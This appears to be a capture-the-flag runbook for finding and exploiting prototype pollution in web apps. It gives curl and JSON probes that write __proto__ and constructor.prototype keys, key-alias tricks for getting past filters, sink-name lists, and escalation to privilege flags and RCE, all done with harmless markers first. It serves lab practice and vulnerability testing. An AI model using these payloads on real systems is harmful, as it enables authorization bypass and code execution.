# Field manual — the end-to-end engagement procedure

The numbered runbook for a suspected PP target, from first response
to a verified payoff, with the ledger lines at each step.

---

## 0. Triage — is this even the class?

Signals that route here:

- A recursive merge of request data (`_.merge`, `extend(true,..)`,
  hand-rolled `for..in` recursion) in source or behavior
- A dotted-path setter API (`{"field":"a.b","value":v}`)
- A document-store update forwarding `$`-operators
- A config/options object request-shaped and later read with `||`/
  `??`/destructuring fallbacks
- A Python `setattr`/`getattr`-walk merge, or `__dict__.update`
- Behavior: sending `{"a":{"b":{"c":1}}}` produces nested effects
  (the merge walks depth)

Signals it's NOT this class:

- Direct scalar writes to own properties (`{"isAdmin":true}` at
  top-level) → mass-assignment
- A flat object-store write with no recursion → same
- Serialized-blob processing (`pickle`/`serialize`/`unserialize`) →
  deserialization class
- `$`-operator injection inside a query filter → nosqli

## 1. Baseline — map the surface

```bash
# 1. enumerate the mutation endpoints
python3 tools/web/enum_probe.py --url <base> --selftest   # shapes
# then a bounded endpoint list from recon (do not scan broadly)

# 2. fingerprint the parser
curl "$BASE/x?a[b]=1"              # qs nested? → bracket carrier
curl -X POST "$BASE/x" -H 'Content-Type: application/json' \
  -d '{"a":{"b":{"c":1}}}'         # JSON nested? → JSON carrier

# 3. the version evidence (white-box)
python3 tools/gadget_lookup.py --lockfile <handout>/package-lock.json
```

## 2. First probe — the harmless marker

```bash
python3 tools/web/pp_probe.py --url <url> --method POST \
  --body '{"__proto__":{"ppmarker":"v1"}}' \
  --readback <fresh-object-or-behavior-url>

# the arms, one request each
arms=(
  '{"__proto__":{"ppmarker":"v1"}}'
  '{"a":{"__proto__":{"ppmarker":"v1"}}}'
  '{"a":{"b":{"__proto__":{"ppmarker":"v1"}}}}'
  '{"constructor":{"prototype":{"ppmarker":"v1"}}}'
  '{"a":{"constructor":{"prototype":{"ppmarker":"v1"}}}}'
  '{"profile":{"__proto__":{"ppmarker":"v1"}}}'
)
```

A `marker-on-readback` or `readback-changed` = the write lands on
the shared root. A clean fresh-object on all arms = refute → park.

## 3. Carrier sweep — if JSON body is dead

```bash
# qs
curl "$BASE/x?__proto__[ppmarker]=v1"
curl "$BASE/x?a[__proto__][ppmarker]=v1"
# form
curl -X POST "$BASE/x" -d '__proto__[ppmarker]=v1'
# path-API
curl -X POST "$BASE/x" -d '{"field":"__proto__.ppmarker","value":"v1"}'
# update-doc (pinned to YOUR document)
curl -X POST "$BASE/x" -d '{"filter":{"_id":"<own>"},"$rename":{"bio":"__proto__.ppmarker"}}'
# header-reparse / cookie-JSON / multipart / ws / fragment — one each
```

## 4. Key-alias sweep — if `__proto__` is filtered

```bash
for key in 'constructor.prototype' 'a.constructor.prototype' \
           '__prot\\u006f__' 'proto' 'prototype'; do
  # substitute into the working carrier; one probe each
done
```

All refute → the merge guards its keys → falsifier → park.

## 5. Sink hunt — what reads the polluted name

```bash
# white-box
grep -rnoE '[a-zA-Z_$.]+\.[a-zA-Z_]+\s*(\|\||\?\?|===?\s*undefined)' \
  <src> --include='*.js' | sort -u

# black-box — the gadget-index name list, one write per name
names=(isAdmin role level verified owner_id tenant_id url api src
       href shell env execPath main paths outputFunctionName debug)
```

Match discovered reads against `gadget-index.md` — the property name
the app reads IS the one to write.

## 6. Behavior confirmation — the fallback fires

```bash
# write the sink's name, harmless value
{"__proto__":{"isAdmin":true}}          # then hit the gated route
{"__proto__":{"url":"http://marker/"}}  # then trigger the fetch
{"__proto__":{"debug":true}}            # then read error verbosity
```

The change has to be attributable to the fallback: before-write =
default behavior, after-write = your value's behavior. A diff that
doesn't track the write is not evidence.

## 7. Payoff — the escalation, once per sink

`pollution-to-rce.md` / `pollution-to-xss.md` — the marker-first
discipline applies: every RCE/XSS gadget gets a benign proof
(write a file marker, render a string marker, an error-message
marker) before the flag-read variant.

## 8. Cleanup — the blast-radius obligation

```bash
# record what was polluted BEFORE the payoff
python3 tools/state.py <chal> --hypothesis-id <id> \
  --decision "wrote Object.prototype.ppmarker; cleanup = restart"

# after impact: restart the instance or restore the object if the
# app exposes a reset; on a shared contest box, note it in the
# solve card's blast_radius
```

## 9. The ledger sequence

```bash
python3 tools/state.py <c> --hypothesis "carrier:json-body merge"
python3 tools/state.py <c> --hypothesis-id 1 --result confirms --status proven
python3 tools/state.py <c> --hypothesis "key:__proto__ lands"
python3 tools/state.py <c> --hypothesis-id 2 --result confirms --status proven
python3 tools/state.py <c> --hypothesis "sink:outputFunctionName->ejs"
python3 tools/state.py <c> --hypothesis-id 3 --result confirms --status proven
# payoff probe — flag through the gate
python3 tools/hooks.py pre-flag <c> --value '<flag>' --evidence '<excerpt>'
```

## 10. The stop conditions

- All carriers × all key aliases refute on fresh-object readback →
  merge is guarded — park with the falsifier.
- Write lands (fresh-object marker) but NO sink reads any writable
  name → capability-not-vuln — record, park.
- The sink reads `hasOwnProperty`/own-only → falsifier — park.
- Behavior changes but the write can't be attributed (it changes
  without pollution too) → inconclusive — find a cleaner oracle.

## 11. Time/practicality notes

- One marker per probe — never a payload-with-impact as the first
  probe of a new arm.
- The fresh-object oracle is the cheapest confirm; use it before
  any behavior oracle.
- White-box: mine the merge+sink in ~15 min; the probe sequence is
  then a verification, not a search.
- Black-box: the arm sweeps are ~15 requests total — cheap. The
  sink-name hunt is the expensive half; bound it to the gadget
  index's ~40 names × the confirmed carrier.
